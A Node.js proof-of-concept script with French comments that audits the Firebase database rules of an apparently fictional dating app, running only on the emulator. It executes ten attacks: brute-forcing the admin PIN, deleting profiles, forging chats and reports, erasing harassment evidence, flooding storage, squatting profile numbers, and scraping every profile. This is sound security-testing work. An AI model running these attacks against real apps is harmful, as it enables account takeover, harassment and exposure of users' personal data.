/* PoC d'audit — émulateur uniquement (projet fictif). Chaque ligne affiche si l'attaque PASSE aujourd'hui. */
const fs = require("fs");
const { initializeTestEnvironment } = require("@firebase/rules-unit-testing");
const { ref, get, set, update, remove, push } = require("firebase/database");
const res = [];
async function tryIt(name, fn) { try { const r = await fn(); res.push(["PASSE (vulnérable)", name, r || ""]); } catch (e) { res.push(["bloqué", name, String(e.message).slice(0, 60)]); } }
(async () => {
  const env = await initializeTestEnvironment({ projectId: "dereh-halev-test", database: { rules: fs.readFileSync(__dirname + "/database.rules.json", "utf8") } });
  const P = (no, g) => ({ no, gender: g, age: 30, city: "x", religion: "dati", intent: "see", words: ["a", "b", "c"], shabbat: "-", createdAt: 1 });
  await env.withSecurityRulesDisabled(async ctx => set(ref(ctx.database(), "/"), {
    config: { adminPin: "4829" }, counters: { profileNo: 3 },
    profiles: { alice: P(1, "f"), bob: P(2, "m"), eve: P(3, "f") }, profileNos: { 1: "alice", 2: "bob", 3: "eve" },
    private: { alice: { firstName: "A", phone: "0501111111" } },
    inbox: { bob: { alice: { fromNo: 1, status: "pending", createdAt: 1 } } },
    outbox: { alice: { bob: { toNo: 2, status: "pending", createdAt: 1 } } },
    banned: { mallory: true }
  }));
  const db = u => env.authenticatedContext(u).database();
  const A = db("alice"), B = db("bob"), E = db("eve"), M = db("mallory"), X = db("attacker");

  // V1 — Force brute du PIN admin (4 chiffres) : la validation sert d'oracle, sans limite de débit
  await tryIt("V1 brute force PIN 0000-9999 par un compte anonyme", async () => {
    const t0 = Date.now();
    for (let i = 0; i < 10000; i++) {
      const pin = String(i).padStart(4, "0");
      try { await set(ref(X, "admins/attacker"), pin); await get(ref(X, "reports")); return `PIN trouvé (${pin}) en ${i + 1} essais, ${((Date.now() - t0) / 1000).toFixed(1)} s → accès admin`; } catch (e) {}
    }
    throw new Error("non trouvé");
  });
  await tryIt("V1b admin obtenu → lire chats (métadonnées de tous)", () => get(ref(X, "chats")).then(() => "ok"));
  await tryIt("V1c admin obtenu → supprimer le profil d'alice", () => remove(ref(X, "profiles/alice")).then(() => "profil supprimé"));
  await env.withSecurityRulesDisabled(async ctx => set(ref(ctx.database(), "profiles/alice"), P(1, "f")));

  // V2 — Chat créé directement avec opened:true / status libre / champs inconnus volumineux
  await tryIt("V2 chat créé opened:true + champ inconnu 100 Ko", () => set(ref(B, "chats/alice_bob"), { from: "alice", to: "bob", fromNo: 1, toNo: 2, status: "active", opened: true, createdAt: 1, junk: "x".repeat(100000) }));

  // V3 — Le destinataire réécrit l'outbox de l'expéditeur (toNo / chatId arbitraires)
  await tryIt("V3 bob réécrit outbox/alice/bob (toNo=999, chatId piégé)", () => update(ref(B, "outbox/alice/bob"), { toNo: 999, chatId: "evil" }));

  // V4 — Un membre efface la conversation de la liste de sa victime (preuve d'un harcèlement)
  await env.withSecurityRulesDisabled(async ctx => update(ref(ctx.database()), { "userChats/alice/alice_bob": true, "userChats/bob/alice_bob": true }));
  await tryIt("V4 bob supprime userChats/alice/alice_bob", () => remove(ref(B, "userChats/alice/alice_bob")));

  // V5 — Signalement : numéros falsifiés + champ inconnu volumineux
  await env.withSecurityRulesDisabled(async ctx => set(ref(ctx.database(), "chats/alice_bob"), { from: "alice", to: "bob", fromNo: 1, toNo: 2, status: "active", opened: false, createdAt: 1 }));
  await tryIt("V5 report reporterNo/reportedNo falsifiés + 100 Ko", () => push(ref(B, "reports"), { chatId: "alice_bob", reporterUid: "bob", reporterNo: 777, reportedUid: "alice", reportedNo: 999, reason: "x", createdAt: 1, junk: "x".repeat(100000) }));

  // V6 — Stockage illimité (« denial of wallet », plan Blaze)
  await tryIt("V6 hidden : 500 clés arbitraires (cibles inexistantes)", async () => { const o = {}; for (let i = 0; i < 500; i++) o["k" + i + "_".repeat(600)] = true; await set(ref(X, "hidden/attacker"), o); });
  await tryIt("V6b stats : compte anonyme NON inscrit pousse 200 entrées", async () => { for (let i = 0; i < 200; i++) await push(ref(X, "stats/req_sent/20261014"), true); });

  // V7 — Squat de numéro : un inscrit supprime/recrée son profil avec le prochain numéro (DoS d'inscription)
  await env.withSecurityRulesDisabled(async ctx => set(ref(ctx.database(), "counters/profileNo"), 4));   // un nouveau venu vient de tirer le 4
  await tryIt("V7 eve se recrée avec le n°4 tiré par un autre", async () => { await remove(ref(E, "profiles/eve")); await update(ref(E), { "profiles/eve": P(4, "f"), "profileNos/4": "eve" }); });

  // V8 — Banni : écrit encore des signalements / private
  await tryIt("V8 banni : écrire son private", () => set(ref(M, "private/mallory"), { firstName: "M", phone: "1" }));

  // V9 — Texte libre public avec téléphone (filtre seulement côté client)
  await tryIt("V9 profil public avec téléphone dans shabbat", () => update(ref(A, "profiles/alice"), { shabbat: "appelle-moi 050-123-4567" }));
  await tryIt("V9b message avec téléphone (contourne le rideau)", () => push(ref(A, "messages/alice_bob"), { from: "alice", text: "0501234567", ts: 1 }));
  await tryIt("V9c message daté dans le futur (épinglé « non lu »)", () => push(ref(A, "messages/alice_bob"), { from: "alice", text: "hi", ts: 4102444800000 }));

  // V10 — Énumération / scraping : n'importe quel visiteur anonyme (sans profil) lit tous les profils et la liste des bannis
  await tryIt("V10 visiteur sans profil lit profiles + banned", async () => { const p = await get(ref(X, "profiles")); await get(ref(X, "banned")); return Object.keys(p.val()).length + " profils"; });

  await env.cleanup();
  for (const r of res) console.log(r[0].padEnd(20), "|", r[1], "|", r[2]);
  process.exit(0);
})().catch(e => { console.error(e); process.exit(2); });
